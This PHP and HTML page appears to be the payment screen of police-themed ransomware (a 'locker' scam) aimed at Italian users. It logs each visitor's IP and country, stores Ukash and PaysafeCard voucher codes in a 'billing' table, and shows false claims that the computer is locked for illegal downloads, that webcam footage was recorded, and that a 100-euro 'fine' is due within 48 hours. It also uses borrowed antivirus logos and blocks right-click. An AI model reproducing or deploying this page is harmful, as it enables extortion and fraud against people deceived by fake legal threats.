<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 746px;" id="Untitled-1-02"><span id="result_box" class="" lang="it"><span class="hps">Tutta l'attivit&agrave;</span> <span class="hps">di questo computer</span> <span class="hps">&egrave; stato registrato</span><span>.</span> <span class="hps">Se si utilizza la</span> <span class="hps">webcam</span><span class="">,</span> <span class="hps">video e immagini</span> <span class="hps">sono state salvate</span> <span class="hps">per la</span> <span class="hps">webcam</span> <span class="hps">identificazione.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="it"><span class="hps">Il tuo</span> <span class="hps">IP</span><span class="">-Address</span><span class="">:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="it"><span class="hps">Si pu&ograve;</span> <span class="hps">essere chiaramente</span> <span class="hps">identificato dal tuo</span> <span class="hps">indirizzo IP e</span> <span class="hps">l'hostname</span> <span class="hps">associato</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="it"><span style="font-weight: bold;" class="hps">Materiale</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">scaricato illegalmente</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">(</span><span style="font-weight: bold;">MP3, </span><span style="font-weight: bold;" class="hps">film o software</span><span style="font-weight: bold;">) </span><span style="font-weight: bold;" class="hps">&egrave; stato localizzato sul</span> <span class="hps"><span style="font-weight: bold;">tuo compute</span>r</span><br>
<br>
 <span class="hps">Scaricando</span><span>,</span> <span class="hps">queste sono state</span> <span class="hps">riprodotte</span><span>,</span> <span class="hps">comportando cos&igrave; un</span> <span class="hps">reato penale</span> <span class="hps">ai sensi della Sezione</span> <span class="hps">106 della</span> <span class="hps">Legge sul copyright</span><span>.</span><br>
<br>
 <span class="hps">Il downloading di</span> <span class="hps">materiale protetto da copyright</span> <span class="hps">tramite</span> <span class="hps">Internet o</span> <span class="hps">reti di</span> <span class="hps">condivisione della musica</span> <span class="hps">&egrave; illegale</span> <span class="hps">ed &egrave;</span> <span class="hps">in conformit&agrave; con</span><br>
 <span class="hps">La sezione</span> <span class="hps">106 del</span> <span class="hps">Copyright Act</span> <span class="hps">soggetto</span> <span class="hps">ad una multa</span> <span class="hps">o la reclusione per</span> <span class="hps">una pena</span> <span class="hps">fino a</span> <span class="hps">3 anni</span><br>
<br>
 <span class="hps">Futhermore</span><span>,</span> <span class="hps">possesso di materiale</span> <span class="hps">scaricato illegalmente</span> <span class="hps">&egrave; punibile</span> <span class="hps">ai sensi dell'art</span> <span class="hps">184</span> <span class="hps">comma 3 del</span> <span class="hps">codice penale e</span> <span class="hps">pu&ograve; anche portare</span> <span class="hps">alla confisca</span> <span class="hps">del computer</span><span>,</span> <span class="hps">con il quale</span> <span class="hps">sono stati scaricati</span> <span class="hps">i</span> <span class="hps">Diles</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="short_text" lang="it"><span class="hps">Seguire le istruzioni</span> <span class="hps">sulla destra</span></span>

<form name="ukash_form" method="get" action="IT.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="IT.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="it"><span style="color: rgb(255, 0, 0);" class="hps">Si prega di notare</span><span style="color: rgb(255, 0, 0);">:</span> <span class="hps">Questo</span> <span class="hps">fine pu&ograve;</span> <span class="hps">essere</span> <span class="hps">versato entro</span> <span class="hps">48 ore,</span> <span class="hps">se si lascia</span> <span class="hps">passare</span> <span class="hps">48 ore</span> <span class="hps">senza alcun pagamento</span><span>,</span> <span class="hps">la possibilit&agrave; di</span> <span class="hps">sbloccare</span> <span class="hps">il computer</span> <span class="hps">scadenza</span><span>.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">In</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">questo caso</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">un procedimento penale</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">contro di voi</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">sar&agrave; avviata</span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">automaticamente</span>.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="it"><span class="hps">Come sbloccare</span><span>?</span><br>
<br>
 <span class="hps">In conformit&agrave; con</span> <span class="hps">la legge</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">"</span><span style="font-weight: bold;">per il controllo </span><span style="font-weight: bold;" class="hps">e protezione delle informazioni</span><span><span style="font-weight: bold;">"</span> on</span> <span class="hps">2012/02/01</span> <span class="hps">Devi pagare</span> <span class="hps">una multa di</span> <span style="font-weight: bold;" class="hps">100 euro</span><span>.</span> <span class="hps">Per la comodit&agrave;</span> <span class="hps">di pagare una</span> <span class="hps">multa</span> <span class="hps">offerta</span> <span class="hps">di utilizzare</span> <span class="hps">una forma</span> <span class="hps">di pagamento sicuro</span> <span class="hps">tramite voucher</span> <span style="font-weight: bold;" class="hps">Ukash</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">/</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">PaysafeCard</span><span>.</span> <span class="hps">&Egrave; necessario</span> <span class="hps">acquistare i buoni</span> <span class="hps">per un importo di</span> <span style="font-weight: bold;" class="hps">100 euro</span><span>,</span> <span class="hps">dopo aver</span> <span class="hps">compilare i</span> <span class="hps">campi appropriati</span><span>,</span> <span class="hps atn">fare clic su "</span><span class="">OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
